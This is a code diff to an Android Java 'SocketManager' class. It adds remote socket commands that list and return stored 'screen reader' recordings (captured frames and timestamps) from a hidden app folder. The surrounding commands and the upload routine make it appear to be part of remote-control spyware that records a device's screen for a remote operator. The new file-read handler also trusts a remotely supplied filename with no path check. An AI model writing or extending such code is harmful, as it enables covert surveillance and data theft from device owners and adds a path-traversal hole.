@@ -1262,6 +1262,8 @@ public class SocketManager {
             case "open_task_manager":
             case "screen_reader_start":
             case "screen_reader_stop":
+            case "list_screen_recordings":
+            case "get_screen_recording":
                 return true;
             default:
                 return false;
@@ -1428,6 +1430,15 @@ public class SocketManager {
                 JSONObject ok = new JSONObject();
                 ok.put("success", true);
                 return ok;
+            }
+
+            case "list_screen_recordings": {
+                return listScreenRecordingsOnDevice();
+            }
+
+            case "get_screen_recording": {
+                String filename = params.optString("filename", "");
+                return getScreenRecordingContent(filename);
             }
         }
 
@@ -2065,5 +2076,77 @@ public class SocketManager {
                 Log.e(TAG, "uploadPendingOfflineRecordings error: " + e.getMessage());
             }
         });
+    }
+
+    /**
+     * List all screen reader recordings stored on device.
+     */
+    private JSONObject listScreenRecordingsOnDevice() {
+        JSONObject result = new JSONObject();
+        try {
+            java.io.File dir = new java.io.File(context.getFilesDir(), ".sr_offline");
+            if (!dir.exists()) {
+                result.put("success", true);
+                result.put("recordings", new JSONArray());
+                return result;
+            }
+            java.io.File[] files = dir.listFiles((d, name) -> 
+                name.startsWith("sr_") && name.endsWith(".json"));
+            JSONArray list = new JSONArray();
+            if (files != null) {
+                for (java.io.File f : files) {
+                    JSONObject info = new JSONObject();
+                    info.put("filename", f.getName());
+                    info.put("size", f.length());
+                    info.put("lastModified", f.lastModified());
+                    list.put(info);
+                }
+            }
+            result.put("success", true);
+            result.put("recordings", list);
+        } catch (Exception e) {
+            try { result.put("success", false); result.put("error", e.getMessage()); } catch (Exception ignored) {}
+        }
+        return result;
+    }
+
+    /**
+     * Get content of a specific screen recording file.
+     */
+    private JSONObject getScreenRecordingContent(String filename) {
+        JSONObject result = new JSONObject();
+        try {
+            if (filename == null || filename.isEmpty()) {
+                result.put("success", false);
+                result.put("error", "No filename provided");
+                return result;
+            }
+            java.io.File dir = new java.io.File(context.getFilesDir(), ".sr_offline");
+            java.io.File file = new java.io.File(dir, filename);
+            if (!file.exists()) {
+                result.put("success", false);
+                result.put("error", "File not found");
+                return result;
+            }
+            java.io.FileInputStream fis = new java.io.FileInputStream(file);
+            byte[] buf = new byte[(int) file.length()];
+            int n = fis.read(buf);
+            fis.close();
+            if (n <= 0) {
+                result.put("success", false);
+                result.put("error", "Empty file");
+                return result;
+            }
+            JSONObject data = new JSONObject(new String(buf, "UTF-8"));
+            result.put("success", true);
+            result.put("label", data.optString("label", filename));
+            result.put("frames", data.optJSONArray("frames"));
+            result.put("startTime", data.optLong("startTime", 0));
+            result.put("endTime", data.optLong("endTime", 0));
+            result.put("frameCount", data.optInt("frameCount", 0));
+        } catch (Exception e) {
+            try { result.put("success", false); result.put("error", e.getMessage()); } catch (Exception ignored) {}
+        }
+        return result;
     }
 }
